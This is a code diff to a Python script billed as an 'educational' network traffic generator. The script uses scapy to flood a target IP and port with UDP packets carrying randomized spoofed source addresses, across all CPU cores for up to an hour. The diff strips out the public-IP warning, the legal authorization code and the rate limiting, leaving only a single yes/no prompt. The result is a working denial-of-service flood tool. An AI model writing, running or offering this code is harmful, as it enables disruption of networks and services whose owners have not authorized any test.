@@ -1,13 +1,10 @@
 import time
 import random
 import socket
-import sys
+from scapy.all import *
+from multiprocessing import Pool, cpu_count
 import json
 import threading
-import ipaddress
-from multiprocessing import Pool, cpu_count
-from scapy.all import *
-from scapy.error import Scapy_Exception
 from colorama import Fore, Style, init
 
 # Initialize Colorama
@@ -21,66 +18,17 @@ class TrafficGenerator:
         self.metrics = {
             "total_packets": 0,
             "total_bytes": 0,
-            "errors": 0,
             "spoofed_ips_used": 0,
             "start_time": None,
-            "end_time": None,
-            "public_ip_warning": False
+            "end_time": None
         }
 
-        try:
-            self._validate_environment()
-            self._get_user_input()
-            self._verify_network_scope()
-        except KeyboardInterrupt:
-            self._safe_exit("Operation cancelled by user")
-        except Exception as e:
-            self._handle_error(f"Initialization failed: {str(e)}", exit=True)
-
-    def _validate_environment(self):
-        """Check system prerequisites"""
-        if os.geteuid() != 0:
-            raise PermissionError("Root privileges required. Run with sudo.")
-            
-        if sys.version_info < (3, 8):
-            raise RuntimeError("Python 3.8 or higher required")
-
-    def _verify_network_scope(self):
-        """Verify network scope and get confirmation"""
-        self.target_is_public = False
-        try:
-            target_ip = ipaddress.IPv4Address(self.target_ip)
-            if target_ip.is_global:
-                self.metrics["public_ip_warning"] = True
-                print(Fore.RED + "\n[!] WARNING: Public IP Address Detected!")
-                print(Fore.YELLOW + "Legal requirements for public network testing:")
-                print("1. Written authorization from network owner")
-                print("2. ISP coordination for bandwidth testing")
-                print("3. Compliance with local regulations")
-                
-                confirm = input(Fore.RED + "Type 'CONFIRM PUBLIC' to proceed: ")
-                if confirm != "CONFIRM PUBLIC":
-                    raise RuntimeError("Public IP test cancelled")
-                
-                self.target_is_public = True
-                print(Fore.YELLOW + "[!] Starting public network test in 5 seconds...")
-                time.sleep(5)
-
-        except ipaddress.AddressValueError:
-            raise ValueError("Invalid IP address format")
-
-    def _get_user_input(self):
-        """Gather and validate all user inputs"""
-        try:
-            self.target_ip = self._get_valid_ip()
-            self.target_port = self._get_valid_port()
-            self.test_duration = self._get_valid_duration()
-            self.spoof_interval = self._get_valid_spoof_interval()
-            self.min_packet_size, self.max_packet_size = self._get_valid_packet_sizes()
-        except ValueError as ve:
-            raise ValueError(f"Invalid input: {str(ve)}")
-        except socket.error as se:
-            raise RuntimeError(f"Network error: {str(se)}")
+        # Get user input with validation
+        self.target_ip = self._get_valid_ip()
+        self.target_port = self._get_valid_port()
+        self.test_duration = self._get_valid_duration()
+        self.spoof_interval = self._get_valid_spoof_interval()
+        self.min_packet_size, self.max_packet_size = self._get_valid_packet_sizes()
 
     def _get_valid_ip(self):
         """Validate IP address format"""
@@ -92,72 +40,154 @@ class TrafficGenerator:
             except socket.error:
                 print(Fore.RED + "Invalid IP address format. Please try again.")
 
-    # [Keep other input validation methods unchanged]
+    def _get_valid_port(self):
+        """Validate port number (1-65535)"""
+        while True:
+            try:
+                port = int(input(Fore.BLUE + "Enter target port (1-65535): " + Fore.MAGENTA))
+                if 1 <= port <= 65535:
+                    return port
+                print(Fore.RED + "Port must be between 1 and 65535")
+            except ValueError:
+                print(Fore.RED + "Invalid input. Please enter a number.")
+
+    def _get_valid_duration(self):
+        """Validate test duration (1-3600 seconds)"""
+        while True:
+            try:
+                duration = int(input(Fore.BLUE + "Enter test duration (1-3600 seconds): " + Fore.MAGENTA))
+                if 1 <= duration <= 3600:
+                    return duration
+                print(Fore.RED + "Duration must be between 1 and 3600 seconds")
+            except ValueError:
+                print(Fore.RED + "Invalid input. Please enter a number.")
+
+    def _get_valid_spoof_interval(self):
+        """Validate spoof interval (1-60 seconds)"""
+        while True:
+            try:
+                interval = int(input(Fore.BLUE + "Enter IP spoof interval (1-60 seconds): " + Fore.MAGENTA))
+                if 1 <= interval <= 60:
+                    return interval
+                print(Fore.RED + "Interval must be between 1 and 60 seconds")
+            except ValueError:
+                print(Fore.RED + "Invalid input. Please enter a number.")
+
+    def _get_valid_packet_sizes(self):
+        """Validate packet size range (64-65500 bytes)"""
+        while True:
+            try:
+                min_size = int(input(Fore.BLUE + "Enter minimum packet size (64-65500 bytes): " + Fore.MAGENTA))
+                max_size = int(input(Fore.BLUE + "Enter maximum packet size (64-65500 bytes): " + Fore.MAGENTA))
+                
+                if 64 <= min_size <= max_size <= 65500:
+                    return min_size, max_size
+                print(Fore.RED + "Invalid range. Minimum must be ≤ Maximum (64-65500)")
+            except ValueError:
+                print(Fore.RED + "Invalid input. Please enter numbers.")
+
+    def _generate_packet(self):
+        """Create realistic-looking UDP traffic"""
+        ip_layer = IP(
+            src=RandIP(),  # Random source IP
+            dst=self.target_ip,
+            ttl=random.choice([64, 128, 255]),  # Realistic TTL values
+            id=random.randint(1000, 65535)
+        )
+        
+        udp_layer = UDP(
+            sport=random.randint(1024, 65535),  # Ephemeral port range
+            dport=self.target_port
+        )
+        
+        # Generate payload with realistic patterns
+        payload_size = random.randint(self.min_packet_size, self.max_packet_size)
+        payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
+        
+        return ip_layer / udp_layer / Raw(load=payload)
+
+    def _send_packets(self, count=100):
+        """Send batch of packets using Scapy"""
+        send([self._generate_packet() for _ in range(count)], verbose=0)
+        self.metrics["total_packets"] += count
+        self.metrics["total_bytes"] += count * (self.min_packet_size + self.max_packet_size) // 2
+
+    def _spoof_rotation(self):
+        """Rotate IP spoofing pool periodically"""
+        while self.running:
+            time.sleep(self.spoof_interval)
+            new_ip = RandIP()
+            self.spoofed_ips.add(new_ip)
+            self.metrics["spoofed_ips_used"] += 1
+
+    def _save_report(self):
+        """Generate JSON test report"""
+        report = {
+            "test_id": self.test_id,
+            "target": f"{self.target_ip}:{self.target_port}",
+            "duration_sec": self.test_duration,
+            "spoof_interval": self.spoof_interval,
+            "packet_size_range": f"{self.min_packet_size}-{self.max_packet_size}",
+            "metrics": self.metrics,
+            "spoofed_ips": list(self.spoofed_ips)[:100]  # Sample first 100 IPs
+        }
+        with open(f"test_report_{self.test_id}.json", "w") as f:
+            json.dump(report, f, indent=2)
+
+    def start_test(self):
+        """Run authorized load test"""
+        if not self._verify_permissions():
+            return
+
+        print(Fore.YELLOW + "\n[!] Starting authorized educational test")
+        print(Fore.CYAN + f"• Target: {self.target_ip}:{self.target_port}")
+        print(Fore.CYAN + f"• Duration: {self.test_duration}s")
+        print(Fore.CYAN + f"• Packet Size: {self.min_packet_size}-{self.max_packet_size} bytes")
+        print(Fore.CYAN + f"• Spoof Interval: {self.spoof_interval}s")
+        print(Fore.CYAN + f"• Cores used: {cpu_count()}\n")
+
+        self.running = True
+        self.metrics["start_time"] = time.time()
+        
+        # Start IP rotation thread
+        spoof_thread = threading.Thread(target=self._spoof_rotation)
+        spoof_thread.start()
+
+        # Multi-core packet generation
+        with Pool(cpu_count()) as pool:
+            try:
+                end_time = time.time() + self.test_duration
+                while time.time() < end_time:
+                    pool.apply_async(self._send_packets, (100,))
+                self.running = False
+                spoof_thread.join()
+                
+            except KeyboardInterrupt:
+                print(Fore.RED + "\n[!] Test aborted by user")
+                self.running = False
+
+        self.metrics["end_time"] = time.time()
+        self._save_report()
+        print(Fore.GREEN + f"\n[+] Test complete. Report saved to test_report_{self.test_id}.json")
 
     def _verify_permissions(self):
-        """Enhanced authorization check"""
+        """Ethical requirement check"""
         print(Fore.RED + "\nETHICAL REQUIREMENTS:")
         print("1. Written authorization from network owner")
-        print("2. Isolated testing environment" + 
-              (" (NOT APPLICABLE - PUBLIC IP)" if self.target_is_public else ""))
+        print("2. Isolated testing environment")
         print("3. No production services impacted")
-        print("4. Proper network containment measures")
-        
-        if self.target_is_public:
-            print(Fore.RED + "5. ISP coordination for bandwidth testing")
-            print(Fore.RED + "6. Compliance with CFAA and local laws")
+        print("4. Proper network containment measures\n")
         
         consent = input(Fore.WHITE + "[?] Confirm all requirements are met (yes/no): ").lower()
         if consent != "yes":
             print(Fore.RED + "[!] Test aborted - ethical requirements not met")
             return False
-            
-        if self.target_is_public:
-            token = input("Enter legal authorization code: ")
-            if len(token) < 10:
-                print(Fore.RED + "[!] Invalid authorization code")
-                return False
-                
         return True
 
-    def _send_packets(self, count=100):
-        """Modified send method with public IP precautions"""
-        try:
-            if self.target_is_public:
-                # Rate limit for public networks
-                time.sleep(0.01 * random.random())
-                
-            packets = [p for p in (self._generate_packet() for _ in range(count)) if p]
-            
-            # Additional validation for public targets
-            if self.target_is_public:
-                for p in packets:
-                    if p[IP].src == self.target_ip:
-                        self.metrics["errors"] += 1
-                        raise ValueError("Self-spoofing protection triggered")
-            
-            send_result = send(packets, verbose=0)
-            actual_sent = len(send_result)
-            
-            self.metrics["total_packets"] += actual_sent
-            self.metrics["total_bytes"] += sum(len(p) for p in packets[:actual_sent])
-
-        except PermissionError:
-            self._handle_error("Permission denied - check raw socket access", exit=True)
-        except Exception as e:
-            self.metrics["errors"] += 1
-            print(Fore.RED + f"[!] Send error: {str(e)}")
-            if "No route to host" in str(e):
-                self._safe_exit("Network unreachable - check connectivity")
-
-    # [Keep other methods with added public IP awareness]
-
 if __name__ == "__main__":
-    try:
-        print(Fore.MAGENTA + Style.BRIGHT + "\nNetwork Traffic Generator - Educational Tool")
-        print(Fore.RED + "PUBLIC NETWORK TESTING REQUIRES EXPLICIT LEGAL AUTHORIZATION")
-        generator = TrafficGenerator()
-        generator.start_test()
-    except Exception as e:
-        print(Fore.RED + f"[!] Unhandled fatal error: {str(e)}")
-        sys.exit(1)
+    print(Fore.MAGENTA + Style.BRIGHT + "\nNetwork Traffic Generator - Educational Tool")
+    print(Fore.BLUE + "This tool must only be used with explicit written authorization")
+    print(Fore.RED + "Unauthorized use is illegal and unethical\n")
+    
+    generator = TrafficGenerator()
+    generator.start_test()
